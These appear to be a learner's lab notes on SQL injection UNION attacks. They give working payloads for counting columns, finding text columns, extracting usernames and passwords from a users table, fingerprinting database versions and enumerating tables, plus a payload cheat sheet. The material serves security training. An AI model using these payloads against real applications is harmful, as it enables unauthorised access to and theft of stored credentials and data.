# UNION Attacks

---

## What is a UNION Attack?
The UNION operator allows combining results of two or more SELECT queries.
An attacker uses this to extract data from other tables in the database.

### Requirements for UNION Attack
1. Same number of columns in both queries
2. Compatible data types in each column

---

## Step 1 — Determine Number of Columns

### Lab: UNION attack, determining the number of columns

### Method 1: ORDER BY
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    ← error here = 2 columns exist
```

### Method 2: NULL injection
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--    ← no error = 3 columns exist
```

### What I Learned
- Keep incrementing until you get an error
- NULL is used because it's compatible with any data type

---

## Step 2 — Find Column Containing Text

### Lab: UNION attack, finding a column containing text

### Attack
```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

### What I Learned
- Replace NULL one by one with a string
- No error = that column accepts text (string data type)

---

## Step 3 — Retrieve Data from Other Tables

### Lab: UNION attack, retrieving data from other tables

### Attack
```sql
' UNION SELECT username,password FROM users--
```

### What I Learned
- Once you know number of columns and text columns, you can extract any table
- Always try `users` table first

---

## Step 4 — Retrieve Multiple Values in Single Column

### Lab: UNION attack, retrieving multiple values in single column

### Attack
```sql
' UNION SELECT NULL,username||'~'||password FROM users--
```

### What I Learned
- `||` is string concatenation in Oracle/PostgreSQL
- Use a separator like `~` to split values easily
- MySQL uses `CONCAT(username,'~',password)`

---

## Database Version Detection

### Lab: Querying database type and version on Oracle
```sql
' UNION SELECT BANNER,NULL FROM v$version--
```

### Lab: Querying database type and version on MySQL and Microsoft
```sql
' UNION SELECT @@version,NULL--
```

---

## Database Contents Enumeration

### Lab: Listing database contents on non-Oracle databases
```sql
-- List all tables
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- List columns in a table
' UNION SELECT column_name,NULL FROM information_schema.columns 
WHERE table_name='users'--

-- Extract data
' UNION SELECT username,password FROM users--
```

### Lab: Listing database contents on Oracle
```sql
-- List all tables
' UNION SELECT table_name,NULL FROM all_tables--

-- List columns
' UNION SELECT column_name,NULL FROM all_col_comments
WHERE table_name='USERS'--
```

---

## Key Payloads Summary

| Purpose | Payload |
|---------|---------|
| Find columns (ORDER BY) | `' ORDER BY 1--` |
| Find columns (NULL) | `' UNION SELECT NULL,NULL--` |
| Find text column | `' UNION SELECT 'a',NULL--` |
| Get version (MySQL) | `' UNION SELECT @@version,NULL--` |
| Get version (Oracle) | `' UNION SELECT BANNER,NULL FROM v$version--` |
| List tables | `' UNION SELECT table_name,NULL FROM information_schema.tables--` |
| Concatenate values | `' UNION SELECT NULL,username\|\|'~'\|\|password FROM users--` |

---

## Database Cheat Sheet

| Database | Version Query | String Concat |
|----------|--------------|---------------|
| MySQL | `@@version` | `CONCAT(a,b)` |
| PostgreSQL | `version()` | `a\|\|b` |
| Oracle | `v$version` | `a\|\|b` |
| Microsoft | `@@version` | `a+b` |
